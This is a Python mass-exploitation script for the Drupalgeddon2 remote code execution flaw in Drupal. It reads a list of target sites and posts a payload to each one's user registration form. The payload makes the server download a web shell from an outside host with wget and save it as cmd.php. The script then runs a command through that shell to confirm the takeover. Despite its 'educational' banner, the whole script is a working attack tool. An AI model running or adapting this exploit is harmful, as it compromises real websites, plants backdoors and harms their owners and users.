#!/usr/bin/env
import sys
import requests
import re

print ('################################################################')
print ('# Drupalgeddon2 Remote Code Execution                          #')
print ('# Thanks to All My Friend                                      #') 
print ('# Mass Version by: TukangSihir              site: penyihir.xyz #')     
print ('################################################################')
print ('Provided only for educational or information purposes\n')
file = raw_input("Your File: ")
x = open(file).read().splitlines()

for line in x:
  target = line
  url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
  payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget http://penyihir.xyz/cmd.txt -O cmd.php'}
 
  r = requests.post(url, data=payload)
  r2 = requests.get(line+'cmd.php?cmd=uname -a')
  html = r2.content
  regex = re.compile(r'<.*>')
  if r.status_code != 200:
    print("Not exploitable: "+target)
  else:
    if regex.search(html):
      print('Not Vuln: '+target)
    else:
      if r2.status_code == 200:
        print("\n"+html+target+'cmd.php\n')
      elif r2.status_code == 403:
        print("Forbidden: "+target)
      elif r2.status_code == 404:
        print("Not Found: "+target)
  
#Copyright Vitalii Rudnykh
#https://www.exploit-db.com/exploits/44448/